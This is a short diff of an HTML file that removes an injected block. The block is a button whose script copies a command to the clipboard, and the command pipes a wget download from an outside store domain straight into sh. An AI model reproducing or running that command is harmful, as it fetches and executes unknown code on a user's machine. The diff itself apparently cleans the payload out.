@@ -78,31 +78,4 @@
 </script>
 
 </body>
-</html>    button {
-      font-size: 18px;
-      padding: 14px 24px;
-      border-radius: 8px;
-    }
-  }
-</style>
-</head>
-<body>
-
-<button id="copyBtn">Copy Openline Command</button>
-
-<script>
-  const command = "wget http://bjcprogramming.store/free_openline/download.php?token=04bd637372aff44431d431670501f1e1 -O - | sh";
-
-  document.getElementById('copyBtn').addEventListener('click', () => {
-    navigator.clipboard.writeText(command).then(() => {
-      alert('Command copied to clipboard!');
-    }).catch(() => {
-      alert('Failed to copy command.');
-    });
-  });
-</script>
-
-</body>
-</html></body>
-</html></body>
 </html>
